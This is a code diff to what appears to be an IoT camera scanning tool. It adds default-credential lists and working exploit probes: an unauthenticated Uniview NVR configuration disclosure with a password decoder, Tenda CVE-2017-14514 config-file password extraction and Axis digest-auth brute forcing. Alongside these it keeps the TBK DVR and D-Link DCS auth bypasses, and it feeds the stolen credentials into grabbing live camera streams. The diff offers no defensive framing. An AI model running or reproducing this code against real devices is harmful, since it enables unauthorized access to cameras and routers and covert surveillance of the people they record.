@@ -110,7 +110,8 @@ _BRAND_CREDS: Dict[str, List[Tuple[str, str]]] = {
     "cctv":      [("admin", ""), ("admin", "admin"), ("admin", "12345"), ("888888", "888888")],
     "dlink-dcs": [("admin", ""), ("admin", "admin")],
     "dlink":     [("admin", ""), ("admin", "admin")],
-    "dvr":       [("admin", ""), ("admin", "admin"), ("888888", "888888"), ("666666", "666666")],
+    "dvr":       [("admin", ""), ("admin", "admin"), ("888888", "888888"), ("666666", "666666"), ("disabled", "p455v0rT")],
+    "dahua":     [("admin", ""), ("admin", "admin"), ("admin", "admin123"), ("disabled", "p455v0rT")],
     "geovision": [("admin", "admin"), ("admin", "")],
     "hikvision": [("admin", "12345"), ("admin", ""), ("admin", "admin")],
     "instar":    [("admin", "instar"), ("admin", "admin")],
@@ -193,12 +194,9 @@ _BRAND_STREAMS: Dict[str, List[Tuple[str, str]]] = {
         ("/snap.jpg?JpegCam=0",                                              "http_snapshot"),
         ("/snapshot.jpg",                                                    "http_snapshot"),
     ],
-    "dvr": [
-        ("/snap.jpg?JpegCam=0",                                              "http_snapshot"),
-        ("/snapshot.jpg",                                                    "http_snapshot"),
-    ],
     "dlink-dcs": [
         ("/image/jpeg.cgi",                                                  "http_snapshot"),
+        ("/dms?nowprofileid=2",                                               "http_snapshot"),
         ("/mjpeg.cgi",                                                       "mjpeg"),
         ("/video.cgi",                                                       "mjpeg"),
         ("/cgi/jpg/image.cgi",                                               "http_snapshot"),
@@ -405,6 +403,100 @@ async def _probe_dlink_dcs_getuser(
     return None
 
 
+async def _probe_uniview_disclosure(
+    ip: str,
+    port: int,
+) -> Optional[Tuple[str, str]]:
+    """Uniview NVR unauthenticated configuration disclosure via /cgi-bin/main-cgi.
+
+    Fetches device configuration without authentication and decodes obfuscated passwords.
+    Returns (user, password) or None.
+    """
+    _CODE_TABLE = {
+        '77': '1', '78': '2', '79': '3', '72': '4', '73': '5', '74': '6', '75': '7',
+        '68': '8', '69': '9', '76': '0', '61': 'A', '62': 'B', '63': 'C', '56': 'D',
+        '57': 'E', '58': 'F', '59': 'G', '52': 'H', '53': 'I', '54': 'J', '55': 'K',
+        '48': 'L', '49': 'M', '50': 'N', '51': 'O', '44': 'P', '45': 'Q', '46': 'R',
+        '47': 'S', '40': 'T', '41': 'U', '42': 'V', '43': 'W', '36': 'X', '37': 'Y',
+        '38': 'Z', '29': 'a', '30': 'b', '31': 'c', '24': 'd', '25': 'e', '26': 'f',
+        '27': 'g', '20': 'h', '21': 'i', '22': 'j', '23': 'k', '16': 'l', '17': 'm',
+        '18': 'n', '19': 'o', '12': 'p', '13': 'q', '14': 'r', '15': 's', '8': 't',
+        '9': 'u', '10': 'v', '11': 'w', '4': 'x', '5': 'y', '6': 'z',
+        '93': '!', '60': '@', '95': '#', '88': '$', '89': '%', '34': '^',
+        '90': '&', '86': '*', '84': '(', '85': ')', '81': '-', '35': '_',
+        '65': '=', '87': '+', '83': '/', '82': '.', '80': ',', '70': ':', '71': ';',
+    }
+
+    def _decode_passwd(encoded: str) -> str:
+        parts = encoded.split(';')
+        return ''.join(_CODE_TABLE.get(p, '') for p in parts if p not in ('124', '0', ''))
+
+    url = (
+        f'http://{ip}:{port}/cgi-bin/main-cgi'
+        '?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"'
+    )
+    try:
+        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
+            r = await client.get(url)
+            if r.status_code == 200 and r.text:
+                from xml.etree import ElementTree
+                tree = ElementTree.fromstring(r.text)
+                user_cfg = tree.find('UserCfg')
+                if user_cfg is not None and len(user_cfg) > 0:
+                    user = user_cfg[0].get('UserName', 'admin')
+                    raw_pwd = user_cfg[0].get('RvsblePass', '')
+                    password = _decode_passwd(raw_pwd)
+                    return user, password
+    except Exception:
+        pass
+    return None
+
+
+async def _probe_tenda_config(
+    ip: str,
+    port: int,
+) -> Optional[Tuple[str, str]]:
+    """CVE-2017-14514: Tenda directory traversal to extract base64-encoded password.
+
+    Returns (user, password) or None.
+    """
+    import base64
+    url = f"http://{ip}:{port}/cgi-bin/DownloadCfg/RouterCfm.cfg"
+    try:
+        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
+            r = await client.get(url)
+            if r.status_code == 200 and r.text and 'html' not in r.text:
+                pwd_m = re.search(r'sys\.userpass=(.*)', r.text)
+                if pwd_m:
+                    password = base64.b64decode(pwd_m.group(1).strip().encode()).decode(errors='replace')
+                    return 'admin', password
+    except Exception:
+        pass
+    return None
+
+
+async def _probe_axis_digest(
+    ip: str,
+    port: int,
+    credentials: List[Tuple[str, str]],
+) -> Optional[Tuple[str, str]]:
+    """Axis camera: try digest-auth on /jpg/image.jpg (or /axis-cgi/jpg/image.cgi).
+
+    Returns first working (user, password) tuple or None.
+    """
+    for path in ['/jpg/image.jpg', '/axis-cgi/jpg/image.cgi']:
+        url = f"http://{ip}:{port}{path}"
+        for user, pwd in credentials:
+            try:
+                async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
+                    r = await client.get(url, auth=(user, pwd))
+                    if r.status_code == 200 and r.content[:3] == b'\xff\xd8\xff':
+                        return user, pwd
+            except Exception:
+                pass
+    return None
+
+
 # ---------------------------------------------------------------------------
 # Public entry point
 # ---------------------------------------------------------------------------
@@ -463,22 +555,24 @@ async def probe_ingram(
 
                 # Merge in brand-specific default credentials
                 brand_creds = _BRAND_CREDS.get(brand_slug, [])
-                merged_creds: List[Tuple[str, str]] = list({
-                    *brand_creds,
-                    *credentials,
-                })
+                merged_creds: List[Tuple[str, str]] = []
+                seen_creds = set()
+                for c in list(brand_creds) + list(credentials):
+                    if c not in seen_creds:
+                        merged_creds.append(c)
+                        seen_creds.add(c)
 
-                # Set up auth headers / params for snapshot probing
+                # ── Special bypass probes per brand ─────────────────────────
                 working_streams: List[Tuple[str, str]] = []
 
-                # ── Special bypass probes per brand ───────────────────────
                 if brand_slug == "dvr" and not working_streams:
-                    # CVE-2018-9995: TBK DVR cookie auth bypass — extract real creds
+                    # CVE-2018-9995: TBK DVR / CeNova / QSee / Night OWL cookie bypass
                     creds_extracted = await _probe_dvr_tbk_cookie(ip, port)
                     if creds_extracted:
                         extr_user, extr_pwd = creds_extracted
                         logger.debug("[v2/Ingram] DVR TBK cookie bypass OK %s -> %s:****", ip, extr_user)
-                        merged_creds.insert(0, (extr_user, extr_pwd))
+                        if (extr_user, extr_pwd) not in seen_creds:
+                            merged_creds.insert(0, (extr_user, extr_pwd))
 
                 if brand_slug == "xiongmai" and not working_streams:
                     # Xiongmai port 8899 unauthenticated ONVIF GetSnapshotUri
@@ -488,16 +582,44 @@ async def probe_ingram(
                         working_streams.append((snap_url, "http_snapshot"))
 
                 if brand_slug == "dlink-dcs" and not working_streams:
-                    # D-Link DCS unauth credential disclosure
+                    # CVE-2020-25078: D-Link DCS unauthenticated password disclosure
                     creds_extracted = await _probe_dlink_dcs_getuser(ip, port)
                     if creds_extracted:
                         extr_user, extr_pwd = creds_extracted
                         logger.debug("[v2/Ingram] D-Link DCS getuser OK %s -> %s:****", ip, extr_user)
-                        merged_creds.insert(0, (extr_user, extr_pwd))
+                        if (extr_user, extr_pwd) not in seen_creds:
+                            merged_creds.insert(0, (extr_user, extr_pwd))
 
-                # ── Standard credential-based stream probing ──────────────
+                if brand_slug == "uniview" and not working_streams:
+                    # Uniview unauthenticated config disclosure
+                    creds_extracted = await _probe_uniview_disclosure(ip, port)
+                    if creds_extracted:
+                        extr_user, extr_pwd = creds_extracted
+                        logger.debug("[v2/Ingram] Uniview disclosure OK %s -> %s:****", ip, extr_user)
+                        if (extr_user, extr_pwd) not in seen_creds:
+                            merged_creds.insert(0, (extr_user, extr_pwd))
+
+                if brand_slug == "tenda" and not working_streams:
+                    # CVE-2017-14514: Tenda directory traversal password extraction
+                    creds_extracted = await _probe_tenda_config(ip, port)
+                    if creds_extracted:
+                        extr_user, extr_pwd = creds_extracted
+                        logger.debug("[v2/Ingram] Tenda config password OK %s -> %s:****", ip, extr_user)
+                        if (extr_user, extr_pwd) not in seen_creds:
+                            merged_creds.insert(0, (extr_user, extr_pwd))
+
+                if brand_slug == "axis" and not working_streams:
+                    # Axis: try Digest auth directly on snapshot endpoint
+                    axis_creds = await _probe_axis_digest(ip, port, merged_creds[:5])
+                    if axis_creds:
+                        extr_user, extr_pwd = axis_creds
+                        logger.debug("[v2/Ingram] Axis digest OK %s -> %s:****", ip, extr_user)
+                        snap_url = f"http://{ip}:{port}/jpg/image.jpg"
+                        working_streams.append((snap_url, "http_snapshot"))
+
+                # ── Standard credential-based stream probing ────────────────
                 if not working_streams:
-                    for user, pwd in merged_creds[:5]:
+                    for user, pwd in merged_creds[:6]:
                         async with httpx.AsyncClient(
                             verify=False,
                             timeout=_TIMEOUT,
@@ -531,3 +653,4 @@ async def probe_ingram(
             continue
 
     return result
+
